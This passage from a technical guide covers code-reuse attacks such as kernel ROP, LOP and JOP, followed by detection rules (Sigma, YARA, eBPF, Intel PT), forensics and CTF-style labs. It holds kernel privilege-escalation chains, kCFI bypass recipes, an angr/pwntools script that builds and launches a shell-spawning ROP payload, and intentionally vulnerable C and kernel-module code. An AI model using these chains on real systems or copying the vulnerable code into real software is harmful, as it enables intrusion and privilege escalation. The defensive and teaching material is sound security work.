wc -l kernel_gadgets.txt
# Typical: 200,000–500,000 gadgets in an unstripped vmlinux

# Search for privilege escalation primitives
grep "prepare_kernel_cred\|commit_creds" /proc/kallsyms
# These are the classic kROP targets:
# prepare_kernel_cred(NULL) → returns a root credential struct
# commit_creds(new_cred)    → applies it to the current task
```

**Standard kROP escalation chain (x86_64):**
1. `pop rdi; ret` → load 0 (NULL) into rdi
2. Call `prepare_kernel_cred(NULL)` → returns init_cred pointer in rax
3. `mov rdi, rax; ret` (or equivalent) → move result to rdi
4. Call `commit_creds(rax)` → current task is now root
5. `swapgs; iretq` sequence → return to user mode cleanly

**CVE-2023-0179 (Linux nftables):** a buffer overflow in the nftables payload expression allowed heap corruption. Exploitation used a kROP chain: corrupt a `msg_msg` structure to achieve arbitrary read (leak KASLR base), then pivot the stack to a controlled heap region containing the `prepare_kernel_cred` / `commit_creds` chain. The exploit bypassed SMEP/SMAP by keeping the entire chain within kernel address space.

**CVE-2021-26708 (Linux AF_VSOCK):** race conditions in `vsock_stream_setsockopt` allowed a use-after-free. The exploit built a kROP chain using `rop_chain` in a pipe buffer page, then redirected the freed `vsock_sock` function pointer to a stack pivot gadget. The chain called `commit_creds(prepare_kernel_cred(0))` and returned to user mode via `swapgs; iretq`.

**Bypassing kCFI.** kCFI checks that indirect call targets match the expected function-type hash. Bypass strategies:
- **Type-compatible gadgets:** find kernel functions with the correct type signature that perform useful side effects. For example, a function `void (*)(struct sock *)` that internally calls `commit_creds` with a derived argument.
- **Direct calls via corrupted dispatch tables:** corrupt a data structure (e.g., `file_operations`, `proto_ops`) whose function pointers are invoked with the correct type by legitimate kernel call sites — the kCFI check passes because the call site type matches.
- **Disabling kCFI:** if the attacker has arbitrary write, overwriting the kCFI hash at the target function's entry point (`movl $expected_hash, %eax; int3; int3` → `nop` sled) disables the check for that function.

### 18.6 Loop-oriented programming (LOP)

LOP (Li et al., 2019, refined post-2020) exploits natural loop constructs in the target program. Unlike ROP (which chains gadgets via `ret`) or JOP (which chains via `jmp`), LOP reuses the program's own loop control flow:

**LOP model:**
1. The attacker corrupts loop-controlling data: iteration count, pointer array, index variable.
2. Each loop iteration dispatches a different "loop body gadget" — a legitimate code path within the loop body that performs a useful primitive (read, write, call).
3. The loop's own back-edge (the conditional branch at the loop bottom) serves as the "dispatch" mechanism — no `ret`, `jmp`, or `call` to an unexpected target.

**Why LOP defeats CFI:** every branch in the loop is a legitimate, compiler-emitted branch. The back-edge is a direct branch to the loop header. Function calls within the loop body go to type-compatible targets. Forward-edge CFI (CET IBT, Clang CFI) and backward-edge CFI (shadow stacks) see only valid transitions.

**LOP gadget taxonomy:**
| Gadget class | Loop pattern | Primitive |
|---|---|---|
| Memory-read | `for (i=0; i<n; i++) buf[idx[i]] = src[off[i]];` | Arbitrary read via controlled `off[]` |
| Memory-write | `for (i=0; i<n; i++) dst[idx[i]] = val[i];` | Arbitrary write via controlled `idx[]`, `val[]` |
| Arithmetic | `for (i=0; i<n; i++) acc += data[i] * coeff[i];` | Controlled computation |
| Conditional | `for (i=0; i<n; i++) if (flag[i]) action_a(); else action_b();` | Conditional dispatch |
| Dispatch | `for (i=0; i<n; i++) handlers[type[i]](args[i]);` | Indirect call (type-compatible, CFI-valid) |

**LOP in interpreters.** Language interpreters (Python bytecode evaluator, Lua VM, PHP Zend engine, Java bytecode interpreter) are naturally LOP-friendly because their main evaluation loop dispatches "opcodes" from an array. Corrupting the opcode array yields arbitrary interpreter-level computation. This is a practical LOP vector because:
- The dispatch loop is legitimate code (CFI-valid)
- The "gadgets" are interpreter opcode handlers (each performs a well-defined operation)
- The attacker controls the opcode stream (corrupted bytecode array)

```c
// Simplified interpreter dispatch loop — natural LOP target
// Corrupting bytecode[] yields attacker-controlled dispatch
while (ip < bytecode_end) {
    opcode = bytecode[ip++];
    switch (opcode) {
        case OP_LOAD:  stack[sp++] = locals[bytecode[ip++]]; break;
        case OP_STORE: locals[bytecode[ip++]] = stack[--sp]; break;
        case OP_ADD:   stack[sp-2] += stack[sp-1]; sp--; break;
        case OP_CALL:  call_function(stack[--sp]); break;
        // ... dozens of opcodes = dozens of LOP gadgets
    }
}
```

**Defense considerations for LOP:**
- Data-flow integrity (DFI): enforce that data values conform to the program's intended data-flow graph — the direct defense, but impractical at scale due to overhead (30–100%).
- Interpreter hardening: integrity checks on bytecode arrays (hash verification before execution), read-only mapping of compiled bytecodes.
- Bounds checking on loop counters: compiler-inserted bounds that prevent loops from executing more iterations than the static analysis determines safe.

---

## 19. Code reuse detection engineering — enhanced coverage

> **Relationship to §17F.** §17F provides foundational detection rules (crash dump ROP indicators, gadget tool execution, SROP audit patterns, basic YARA for chain payloads). This section extends with stack pivot detection, hardware-assisted detection (Intel PT, HPC), eBPF kernel probes, and ETW-based Windows monitoring.

### 19.1 Sigma rules — stack pivot and abnormal return address detection

```yaml
# Rule 4: Stack pivot indicator — RSP pointing outside stack VMA
title: Stack Pivot Detected via Abnormal Stack Pointer
id: b1604d43-fa03-7e8d-2c9f-4d5e6f708192
status: experimental
description: >
    Detects a process crash or security event where the stack pointer (RSP/ESP)
    points outside the thread's legitimate stack VMA range, indicating a stack
    pivot — the first step in most ROP chains.
logsource:
    product: linux
    service: coredump
detection:
    selection_crash:
        EventType: "core_dump"
    selection_pivot:
        - StackPointer|re: "0x[0-9a-f]{8,16}"
        - Signal:
            - "SIGSEGV"
            - "SIGABRT"
    filter_rsp_in_stack:
        StackPointerInStackVMA: true
    condition: selection_crash and selection_pivot and not filter_rsp_in_stack
level: critical
tags:
    - attack.execution
    - attack.defense_evasion
    - attack.t1055
falsepositives:
    - Coroutine/fiber libraries that intentionally swap stacks (libaco, Boost.Context)
    - setjmp/longjmp with stack-allocated jmp_buf
---
# Rule 5: CET shadow stack violation event (Windows)
title: CET Shadow Stack Violation Event
id: c2715e54-gb14-8f9e-3d0a-5e6f70819203
status: experimental
description: >
    Detects Windows Kernel event indicating a Control-flow Enforcement
    Technology shadow stack violation — return address on hardware shadow
    stack does not match the software stack. Indicates ROP attempt on
    CET-enabled process.
logsource:
    product: windows
    service: security
    category: process_tampering
detection:
    selection:
        EventID: 4798
        Provider_Name: "Microsoft-Windows-Security-Auditing"
        Keywords|contains: "shadow stack"
    selection_violation:
        StatusDescription|contains:
            - "CONTROL_STACK_VIOLATION"
            - "shadow stack mismatch"
    condition: selection and selection_violation
level: critical
tags:
    - attack.execution
    - attack.t1203
falsepositives:
    - Debuggers and dynamic instrumentation tools (DynamoRIO, PIN, Frida)
---
# Rule 6: Intel PT trace anomaly — excessive ret-to-non-callsite transitions
title: Intel PT Anomaly - Excessive Returns to Non-Call-Sites
id: d3826f65-hc25-9a0f-4e1b-6f70819203a4
status: experimental
description: >
    Detects Intel Processor Trace analysis output indicating an abnormal
    ratio of return instructions that target addresses not preceded by a
    call instruction — hallmark of ROP execution.
logsource:
    product: linux
    service: audit
detection:
    selection_pt:
        tool: "perf"
        subcommand: "intel-pt"
    selection_anomaly:
        RetToNonCallsite|gt: 50
        TotalReturns|gt: 100
    condition: selection_pt and selection_anomaly
level: high
tags:
    - attack.execution
    - attack.t1059
falsepositives:
    - Tail-call optimization in hot loops (unusual to exceed 50 non-callsite returns)
    - JIT-compiled code with non-standard call conventions
```

### 19.2 YARA rules — enhanced memory forensics

```yara
/* Rule 4: Stack pivot signature — xchg reg, rsp gadget in exploit payload */
rule Stack_Pivot_Gadget_Payload
{
    meta:
        description = "Detects stack pivot gadgets (xchg reg, rsp; ret) embedded in data sections or heap — indicates ROP payload staging"
        severity    = "critical"
        technique   = "T1055"
        author      = "Detection Engineering"

    strings:
        // xchg eax, esp; ret  (on x86_64: 94 c3)
        $xchg_eax_esp_ret = { 94 c3 }
        // xchg rax, rsp; ret  (48 94 c3 — REX.W prefix)
        $xchg_rax_rsp_ret = { 48 94 c3 }
        // mov rsp, rax; ret   (48 89 c4 c3)
        $mov_rsp_rax_ret  = { 48 89 c4 c3 }
        // leave; ret          (c9 c3 — common alternative pivot)
        $leave_ret         = { c9 c3 }

        // Multiple 8-byte aligned addresses in a narrow range
        // (pivot target + ROP chain starting address)
        $addr_pair = { ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 }

    condition:
        1 of ($xchg_eax_esp_ret, $xchg_rax_rsp_ret, $mov_rsp_rax_ret) and
        $leave_ret and $addr_pair
}

/* Rule 5: kROP chain artifacts — kernel address patterns in heap objects */
rule Kernel_ROP_Chain_In_User_Heap
{
    meta:
        description = "Kernel addresses (0xffff8xxx range) packed sequentially in user-accessible heap memory — indicates kROP chain staging via corrupted kernel objects"
        severity    = "critical"
        technique   = "T1068"

    strings:
        // Three consecutive kernel-range addresses (x86_64 Linux canonical kernel range)
        // 0xffff800000000000 – 0xffffffffffffffff
        $kaddr_chain = { ?? ?? ?? ?? ?? ?? ff ff ?? ?? ?? ?? ?? ?? ff ff ?? ?? ?? ?? ?? ?? ff ff }

        // prepare_kernel_cred symbol bytes (if resolved by attacker)
        $prep_cred_str = "prepare_kernel_cred"
        $commit_str    = "commit_creds"

    condition:
        $kaddr_chain and ($prep_cred_str or $commit_str)
}

/* Rule 6: JIT spray payload — repeated NOP-equivalent patterns in JIT code regions */
rule JIT_Spray_Repeated_Constants
{
    meta:
        description = "Repeated identical or near-identical instruction sequences in a memory region — potential JIT spray creating usable gadgets"
        severity    = "high"
        technique   = "T1059.007"

    strings:
        // Pattern: 4-byte constant repeated 8+ times (JIT spray via repeated XOR constants)
        // Common JIT spray: 0x3c909090 repeated → when jumped into at offset+1, yields 90 90 90 3c (NOP NOP NOP CMP)
        $repeated_const = { 90 90 90 3c 90 90 90 3c 90 90 90 3c 90 90 90 3c }

        // WebAssembly i32.const opcode (0x41) followed by a 4-byte value, repeated
        $wasm_const_spray = { 41 ?? ?? ?? ?? 41 ?? ?? ?? ?? 41 ?? ?? ?? ?? 41 ?? ?? ?? ?? }

    condition:
        $repeated_const or (#wasm_const_spray > 10)
}
```

### 19.3 ETW-based detection of control flow anomalies (Windows)

Event Tracing for Windows (ETW) provides kernel-level telemetry for monitoring control flow integrity violations:

```powershell
# Enable CET/CFG violation tracing via Windows Defender Exploit Guard
# Requires Windows 10 21H2+ or Windows 11

# 1. Enable Exploit Protection audit mode for a target process
Set-ProcessMitigation -Name "target.exe" -Enable CFG, StrictCFG -Audit

# 2. Configure ETW session to capture CFG/CET violations
logman create trace CFGAudit -p "Microsoft-Windows-Security-Mitigations" `
    0xFFFFFFFF 0x5 -o C:\Logs\cfg_audit.etl -ets

# 3. Monitor real-time CFG violations
# Use Microsoft's Attack Surface Analyzer or custom ETW consumer:
xperf -on PROC_THREAD+LOADER+CSWITCH -stackwalk CSwitch -f cfg_trace.etl

# 4. Parse CFG violation events (Event ID 12 = CFG violation)
wevtutil qe "Microsoft-Windows-Security-Mitigations/KernelMode" `
    /q:"*[System[EventID=12]]" /f:text /c:50
```

**Key ETW providers for code reuse detection:**

| Provider | GUID | Events |
|----------|------|--------|
| `Microsoft-Windows-Security-Mitigations` | `{FE36BE88-...}` | CFG violations (12), CET violations (18), ACG violations (14) |
| `Microsoft-Windows-Threat-Intelligence` | `{F4E1897A-...}` | Suspicious memory allocations, RWX transitions |
| `Microsoft-Windows-Kernel-Memory` | `{D1D93EF7-...}` | VirtualProtect calls (RW→RX transitions) |

**Detection logic:** alert when a process that was compiled with CFG/CET receives a violation event. A single violation is sufficient for high-confidence alerting because CFG/CET violations do not occur during normal execution — any violation indicates either exploitation or a severe compatibility bug.

### 19.4 eBPF-based detection of kernel code reuse

eBPF programs attached to tracepoints and kprobes can detect kernel code reuse artifacts with minimal overhead:

```c
// eBPF program: detect stack pivot in kernel context
// Attach to kprobe on commit_creds (classic kROP target)

#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

struct event {
    u32 pid;
    u64 rsp;
    u64 stack_base;
    u64 stack_end;
    u64 caller_ip;
};

SEC("kprobe/commit_creds")
int detect_krop_commit_creds(struct pt_regs *ctx)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    u64 rsp = ctx->sp;

    // Read the task's kernel stack boundaries
    u64 stack_base, stack_end;
    bpf_probe_read_kernel(&stack_base, sizeof(stack_base),
                          &task->stack);
    stack_end = stack_base + THREAD_SIZE;

    // If RSP is outside the task's kernel stack, flag as stack pivot
    if (rsp < stack_base || rsp >= stack_end) {
        struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            e->pid = bpf_get_current_pid_tgid() >> 32;
            e->rsp = rsp;
            e->stack_base = stack_base;
            e->stack_end = stack_end;
            e->caller_ip = ctx->ip;
            bpf_ringbuf_submit(e, 0);
        }
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

```bash
# Compile and attach the eBPF probe
clang -O2 -target bpf -D__TARGET_ARCH_x86 \
    -c krop_detect.bpf.c -o krop_detect.bpf.o

# Load with bpftool
bpftool prog load krop_detect.bpf.o /sys/fs/bpf/krop_detect \
    type kprobe

# Attach to commit_creds
bpftool perf attach kprobe name commit_creds \
    pinned /sys/fs/bpf/krop_detect

# Monitor events from ring buffer
bpftool map dump pinned /sys/fs/bpf/krop_events
```

### 19.5 Hardware performance counter (HPC) detection

Hardware performance counters can detect ROP/JOP chains statistically by measuring anomalous branch behavior:

**Key counters for code reuse detection:**

| Counter | Architectural name | What it measures | ROP signature |
|---------|-------------------|------------------|---------------|
| Retired returns | `BR_RET_RETIRED` | Total `ret` instructions | Abnormally high rate relative to `call` count |
| Mispredicted returns | `BR_RET_MISP_RETIRED` | RSB-mispredicted `ret` | Elevated — ROP returns go to addresses not in RSB |
| Retired indirect branches | `BR_IND_RETIRED` | Total indirect `jmp`/`call` | JOP chains show elevated indirect branches |
| Indirect branch misses | `BR_IND_MISP_RETIRED` | BTB-mispredicted indirect branches | JOP targets not in BTB |

```bash
# Profile a suspicious process with perf (Linux)
# Sample hardware counters that indicate ROP/JOP activity

perf stat -e branches,branch-misses,\
r00c4,r00c5 \
    -p <PID> --timeout 5000
# r00c4 = BR_RET_RETIRED (Intel-specific raw event)
# r00c5 = BR_RET_MISP_RETIRED

# Compare ret/call ratio:
perf stat -e '{instructions,br_ret_retired,br_inst_retired}' \
    -p <PID> --timeout 5000

# A normal program has ret_retired ≈ call_retired (within 5%)
# A ROP chain has ret_retired >> call_retired (orders of magnitude higher)
```

**HPC-based detection threshold heuristics (Payer et al.):**
- `ret_mispredicted / ret_total > 0.3` within a 10ms window → ROP indicator
- `indirect_branch / total_branch > 0.5` in a tight window → JOP indicator
- `ret_total / call_total > 2.0` over any 100-instruction window → strong ROP indicator

**Limitations:** HPC counters are statistical. They can detect chains of ≥8–10 gadgets with high accuracy but may miss very short chains (3–4 gadgets). False positives arise from tail-call-heavy code, coroutine switching, and some JIT-compiled patterns.

### 19.6 Intel PT analysis for code reuse chain reconstruction

Intel Processor Trace records a compressed trace of all branch targets, enabling post-mortem reconstruction of the exact control flow — including ROP/JOP chains:

```bash
# Record Intel PT trace of a process (requires Intel PT support)
perf record -e intel_pt//u -p <PID> --timeout 10000

# Decode the trace
perf script --itrace=bep --ns -F+addr,+flags > trace_decoded.txt

# Search for ROP indicators: consecutive ret instructions with
# targets in different code regions (library hopping)
awk '/ret/ { addr=$NF; split(addr, a, "+"); lib=a[1];
     if (prev_lib != "" && prev_lib != lib) hops++;
     prev_lib = lib; total++ }
     END { printf "Ret hops across libraries: %d/%d (%.1f%%)\n",
           hops, total, hops*100/total }' trace_decoded.txt
# Normal: < 5% cross-library ret targets
# ROP chain: > 40% cross-library ret targets

# Reconstruct full chain from PT output
perf script --itrace=cr --ns | grep -E "ret|jmp|call" | \
    head -200 > chain_reconstruction.txt
```

**Intel PT advantages for forensics:**
- Captures the exact sequence of executed branches with cycle-accurate timestamps
- Minimal overhead (~5% CPU, configurable)
- Cannot be evaded by software — the trace is generated by hardware
- Works for kernel and user mode simultaneously

**Practical deployment:** Intel PT is used by Microsoft Defender for Endpoint in "block at first sight" mode and by CrowdFalcon for post-breach investigation. Custom deployment via `perf` or `libipt` is feasible for SOCs with Intel PT-capable hardware (Broadwell and later).

### 19.7 Return address shadow stack violation monitoring

Shadow stack violations (CET on Intel/AMD, GCS on ARM) produce hardware exceptions that can be monitored:

```bash
# Linux: check if CET shadow stack is active for a process
cat /proc/<PID>/status | grep -i "shadow\|cet"
# Expected on CET-enabled: Cpus_allowed + shadow stack flags

# Windows: query CET status per process
# PowerShell:
Get-ProcessMitigation -Name "target.exe" | Select-Object -ExpandProperty ControlFlowGuard
# Check: EnableUserShadowStack, AuditUserShadowStack

# Windows Event Log for shadow stack violations
# Event ID 1 in "Microsoft-Windows-Security-Mitigations/UserMode"
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Security-Mitigations/UserMode';
    ID = 1
} -MaxEvents 20 | Format-Table TimeCreated, Message -Wrap
```

**Alert engineering:** any shadow stack violation in a production process is high-signal because:
1. Normal code never triggers shadow stack mismatches
2. Compatibility exceptions (e.g., longjmp, C++ exceptions) are handled by the runtime without generating violation events
3. Only genuine control-flow hijack or severe corruption causes a violation

Recommended response: capture a minidump/coredump at violation time, quarantine the process, alert the SOC with CRITICAL severity, and preserve the memory image for chain reconstruction via §20 forensic techniques.

---

## 20. Code reuse forensics and testing

### 20.1 Post-exploitation forensic analysis — identifying ROP chains in memory dumps

When a process crashes or is captured mid-exploitation, the memory dump contains the ROP chain on the stack (or in a heap-pivoted region). Forensic reconstruction proceeds:

**Step 1 — Identify the stack pivot point:**

```bash
# Using GDB on a Linux coredump
gdb -batch -ex "info registers rsp rbp rip" \
    -ex "x/64gx \$rsp" \
    -ex "bt" \
    --core core.<pid> /path/to/binary

# If RSP points to a heap region (not within [stack] VMA),
# a stack pivot occurred. Identify the pivot source:
cat /proc/<pid>/maps | grep "\[stack\]"
# Compare RSP value to the stack range
```

**Step 2 — Dump and annotate the chain:**

```python
#!/usr/bin/env python3
"""ROP chain extractor from coredump stack region."""
import struct
import subprocess
import re

def extract_rop_chain(corefile, binary, rsp, count=64):
    """Read 'count' 8-byte values from RSP in the coredump and resolve symbols."""
    # Read raw stack bytes
    gdb_cmd = f'gdb -batch -ex "x/{count}gx {rsp:#x}" --core {corefile} {binary}'
    out = subprocess.check_output(gdb_cmd, shell=True).decode()

    addresses = []
    for line in out.strip().splitlines():
        parts = re.findall(r'0x[0-9a-f]+', line)
        addresses.extend(int(a, 16) for a in parts[1:])  # skip address column

    # Resolve each address to symbol+offset
    for i, addr in enumerate(addresses):
        sym_cmd = f'gdb -batch -ex "info symbol {addr:#x}" --core {corefile} {binary}'
        sym_out = subprocess.check_output(sym_cmd, shell=True).decode().strip()
        print(f"  [{i:3d}] {addr:#018x}  {sym_out}")

    return addresses

if __name__ == "__main__":
    import sys
    extract_rop_chain(sys.argv[1], sys.argv[2], int(sys.argv[3], 16))
```

**Step 3 — Classify gadgets in the chain:**

For each resolved address, disassemble the gadget and classify:
- **Data-loading gadgets:** `pop rdi; ret`, `pop rsi; pop r15; ret` — load controlled values into registers
- **Memory access gadgets:** `mov [rdi], rax; ret` — write attacker value to attacker-chosen address
- **Syscall gadgets:** `syscall; ret` — invoke a syscall with attacker-controlled registers
- **Pivot gadgets:** `xchg rax, rsp; ret` — redirect the stack to attacker-controlled memory

### 20.2 Volatility plugins for code reuse artifact detection

```bash
# Volatility 3: analyze a Linux memory dump for ROP chain artifacts

# 1. List all process VMAs to identify stack and heap regions
vol3 -f memory.raw linux.proc_maps --pid <PID>

# 2. Dump the process stack VMA
vol3 -f memory.raw linux.proc_maps --pid <PID> --dump \
    --filter "stack"

# 3. Search for ROP gadget byte patterns in the stack dump
# (use the YARA rules from §17F.2 and §19.2 against the dump)
yara -r rop_detection_rules.yar stack_dump/

# 4. Check for syscall table modifications (kernel ROP companion)
vol3 -f memory.raw linux.check_syscall

# 5. On Windows: inspect the TEB for shadow stack state
vol3 -f memory.raw windows.vadinfo --pid <PID>
vol3 -f memory.raw windows.threads --pid <PID>
```

**Custom Volatility 3 scanner for stack pivot detection:**

```python
# vol3 plugin skeleton: detect stack pointer outside stack VMA
# Place in volatility3/framework/plugins/linux/stack_pivot_scan.py

from volatility3.framework import interfaces, renderers
from volatility3.framework.configuration import requirements
from volatility3.plugins.linux import proc_maps

class StackPivotScan(interfaces.plugins.PluginInterface):
    """Detect processes where saved RSP is outside the stack VMA."""

    _required_framework_version = (2, 0, 0)

    @classmethod
    def get_requirements(cls):
        return [
            requirements.ModuleRequirement(name='kernel',
                description='Linux kernel'),
            requirements.PluginRequirement(name='proc_maps',
                plugin=proc_maps.Maps),
        ]

    def _generator(self):
        for task in self.context.modules[self.config['kernel']].list_tasks():
            pid = task.pid
            stack_vma = None
            for vma in task.mm.get_mmap_iter():
                if b'[stack]' in vma.get_name():
                    stack_vma = (vma.vm_start, vma.vm_end)
                    break

            if stack_vma is None:
                continue

            # Read saved RSP from pt_regs
            regs = task.thread.sp
            if regs < stack_vma[0] or regs >= stack_vma[1]:
                yield (0, (pid,
                           task.comm.cast("string"),
                           hex(regs),
                           hex(stack_vma[0]),
                           hex(stack_vma[1]),
                           "PIVOT DETECTED"))

    def run(self):
        return renderers.TreeGrid(
            [("PID", int), ("Name", str), ("RSP", str),
             ("Stack Start", str), ("Stack End", str), ("Status", str)],
            self._generator())
```

### 20.3 ROPgadget / Ropper chain validation and testing methodology

Automated gadget tools generate chains that must be validated before use in testing:

```bash
# Step 1: Extract gadgets from the target binary
ROPgadget --binary ./target --ropchain --badbytes "0a0d00" > chain_output.txt

# Step 2: Generate a Pwntools-compatible chain
ROPgadget --binary ./target --ropchain --silent 2>/dev/null | \
    tail -n +2 > rop_chain.py

# Step 3: Validate the chain in Pwntools
python3 -c "
from pwn import *

elf = ELF('./target')
rop = ROP(elf)

# Verify gadgets exist at expected offsets
for gadget_addr in [0x401234, 0x401567, 0x4018ab]:
    disasm = elf.disasm(gadget_addr, 8)
    print(f'{gadget_addr:#x}: {disasm}')

# Verify the chain does not contain bad bytes
chain = rop.chain()
bad = set(b'\x00\x0a\x0d')
for i, byte in enumerate(chain):
    if byte in bad:
        print(f'WARNING: bad byte {byte:#04x} at offset {i}')
"

# Step 4: Test chain execution in controlled environment
# (Use a debugger to single-step through the chain)
gdb -batch \
    -ex "break *0x401234" \
    -ex "run < <(python3 exploit.py)" \
    -ex "si 100" \
    -ex "info registers" \
    ./target
```

**Ropper chain comparison:**

```bash
# Ropper provides alternative chain generation with different heuristics
ropper --file ./target --chain "execve" --badbytes "000a0d"

# Compare gadget quality between tools
# ROPgadget tends to find more gadgets (exhaustive search)
# Ropper tends to produce shorter chains (semantic search)

# Cross-validate: ensure both tools agree on gadget addresses
ROPgadget --binary ./target --only "pop|ret" --depth 3 | sort > gadgets_ropgadget.txt
ropper --file ./target --search "pop ???; ret" | sort > gadgets_ropper.txt
diff gadgets_ropgadget.txt gadgets_ropper.txt
```

### 20.4 Automated exploit generation (AEG) — ANGR and Pwntools integration

```python
#!/usr/bin/env python3
"""Semi-automated ROP chain generation using angr + pwntools."""
import angr
import claripy
from pwn import *

# --- Phase 1: Vulnerability discovery with angr ---
proj = angr.Project('./vuln_binary', auto_load_libs=False)
state = proj.factory.entry_state(
    add_options={angr.options.SYMBOL_FILLS_UNCONSTRAINED_MEMORY}
)

# Symbolic stdin
stdin_len = 256
sym_input = claripy.BVS("stdin", stdin_len * 8)
state.preconstrainer.preconstrain(sym_input, state.posix.stdin)

simgr = proj.factory.simulation_manager(state)

# Find states that reach a crash (IP is symbolic = control flow hijack)
simgr.explore(
    find=lambda s: s.solver.symbolic(s.regs.rip),
    avoid=lambda s: b"Invalid" in s.posix.dumps(1)
)

if simgr.found:
    crash_state = simgr.found[0]
    # Extract the input that causes the crash
    crash_input = crash_state.solver.eval(sym_input, cast_to=bytes)
    offset = crash_input.index(
        crash_state.solver.eval(crash_state.regs.rip, cast_to=bytes)[:4]
    )
    print(f"[+] RIP control at input offset {offset}")

    # --- Phase 2: ROP chain construction with pwntools ---
    elf = ELF('./vuln_binary')
    rop = ROP(elf)

    # Build execve("/bin/sh", NULL, NULL) chain
    rop.call('execve', [next(elf.search(b'/bin/sh\x00')), 0, 0])

    # Assemble final payload
    payload = flat({
        offset: rop.chain()
    }, length=stdin_len)

    print(f"[+] Payload length: {len(payload)}")
    print(f"[+] Chain: {rop.dump()}")

    # --- Phase 3: Validate ---
    p = process('./vuln_binary')
    p.send(payload)
    p.interactive()
```

**angr integration best practices:**
- Use `auto_load_libs=False` to avoid analyzing libc (speed)
- Constrain symbolic input length to match the vulnerability's buffer size
- Use `simgr.explore()` with `avoid` states to prune the search space
- For ASLR targets: use angr to find the vulnerability, then pwntools `DynELF` or `puts` leak for runtime address resolution

### 20.5 CTF-style lab exercises for code reuse variants

Each exercise targets a specific code reuse variant with progressive difficulty:

**Lab 1 — Classic ROP (x86_64, no PIE, no canary):**

```bash
# Compile the vulnerable binary
cat > vuln_rop.c << 'CEOF'
#include <stdio.h>
#include <string.h>
void vuln(void) {
    char buf[64];
    printf("Input: ");
    gets(buf);  // intentionally vulnerable
}
int main(void) {
    vuln();
    return 0;
}
CEOF

gcc -no-pie -fno-stack-protector -z execstack -o vuln_rop vuln_rop.c

# Objective: build a ROP chain to call system("/bin/sh")
# Hints: ROPgadget --binary vuln_rop --ropchain
```

**Lab 2 — SROP (x86_64, minimal gadgets):**

```bash
cat > vuln_srop.c << 'CEOF'
#include <unistd.h>
#include <sys/syscall.h>
// Intentionally minimal binary — only a read and a syscall gadget available
void _start(void) {
    char buf[128];
    syscall(SYS_read, 0, buf, 256);  // overflow
    syscall(SYS_exit, 0);
}
CEOF

gcc -nostdlib -static -no-pie -fno-stack-protector \
    -o vuln_srop vuln_srop.c

# Objective: forge a sigreturn frame to call execve("/bin/sh", 0, 0)
# The binary has almost no gadgets — SROP is the only viable technique
```

**Lab 3 — ret2dlresolve (full RELRO bypass):**

```bash
cat > vuln_ret2dl.c << 'CEOF'
#include <stdio.h>
void vuln(void) {
    char buf[64];
    read(0, buf, 256);
}
int main(void) {
    vuln();
    return 0;
}
CEOF

gcc -no-pie -fno-stack-protector -z norelro -o vuln_ret2dl vuln_ret2dl.c
# Note: -z norelro to allow GOT/PLT manipulation for ret2dlresolve

# Objective: use pwntools' Ret2dlresolvePayload to resolve and call system()
# without any info leak
```

**Lab 4 — Kernel ROP (QEMU + custom vulnerable module):**

```bash
# Build a minimal vulnerable kernel module for kROP practice
cat > vuln_kmod.c << 'CEOF'
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

static ssize_t vuln_write(struct file *f, const char __user *buf,
                          size_t len, loff_t *off) {
    char kbuf[64];
    // Intentionally vulnerable: no bounds check
    if (copy_from_user(kbuf, buf, len))
        return -EFAULT;
    return len;
}

static const struct proc_ops vuln_ops = {
    .proc_write = vuln_write,
};

static int __init vuln_init(void) {
    proc_create("vuln", 0666, NULL, &vuln_ops);
    return 0;
}

static void __exit vuln_exit(void) {
    remove_proc_entry("vuln", NULL);
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
CEOF

# Build against kernel headers, load in QEMU with KASLR disabled for learning
# Objective: overflow kbuf → kROP → commit_creds(prepare_kernel_cred(0))
```

**Lab 5 — JOP chain (ARM64):**

```bash
# Cross-compile for AArch64 (use QEMU user-mode emulation)
cat > vuln_jop.c << 'CEOF'
#include <stdio.h>
#include <string.h>
void vuln(void) {
    char buf[64];
    printf("Input: ");
    gets(buf);
}
int main(void) {
    vuln();
    return 0;
}
CEOF

aarch64-linux-gnu-gcc -no-pie -fno-stack-protector \
    -o vuln_jop vuln_jop.c

# Objective: use BR (indirect branch) gadgets instead of RET gadgets
# ARM64 has no implicit stack interaction on BR — chain must manage
# the link register (X30) and dispatch register explicitly
# Run: qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./vuln_jop
```

### 20.6 Fuzzing for code reuse exploitability

Directed fuzzing can determine whether a vulnerability is exploitable via code reuse:

```bash
# Phase 1: Find the crash with AFL++
afl-fuzz -i corpus/ -o findings/ -m none -- ./target @@

# Phase 2: Triage crashes for exploitability
# Use GDB + exploitable plugin to classify
for crash in findings/crashes/id:*; do
    gdb -batch \
        -ex "run < $crash" \
        -ex "exploitable" \
        ./target 2>&1 | grep -E "Classification|Description"
done

# Phase 3: Use angr's crash analyzer for ROP feasibility
python3 << 'PYEOF'
import angr

proj = angr.Project('./target', auto_load_libs=False)
crash_input = open('findings/crashes/id:000000', 'rb').read()

# Check if we control RIP
state = proj.factory.full_init_state(stdin=angr.SimFile(
    name='stdin', content=crash_input))
simgr = proj.factory.simulation_manager(state)
simgr.run()

for errored in simgr.errored:
    s = errored.state
    if s.solver.symbolic(s.regs.rip):
        print("[+] RIP is symbolic — ROP chain viable")
        rip_val = s.solver.eval(s.regs.rip)
        print(f"    Controlled RIP value: {rip_val:#x}")
    if s.solver.symbolic(s.regs.rsp):
        print("[+] RSP is symbolic — stack pivot possible")
PYEOF

# Phase 4: Directed fuzzing for exploitation primitives
# Use custom mutators that insert ROP chain patterns
# AFL++ custom mutator example (simplified):
AFL_CUSTOM_MUTATOR_LIBRARY=./rop_mutator.so \
    afl-fuzz -i corpus/ -o findings_rop/ -m none -- ./target @@
```

**Exploitation oracle concept:** a directed fuzzer uses an "exploitation oracle" — a function that evaluates whether a crash gives sufficient control for code reuse. Criteria:
1. **RIP control:** can the attacker set RIP to an arbitrary value?
2. **RSP control:** can the attacker set RSP (stack pivot capability)?
3. **Register control:** how many registers contain attacker-controlled values at crash time?
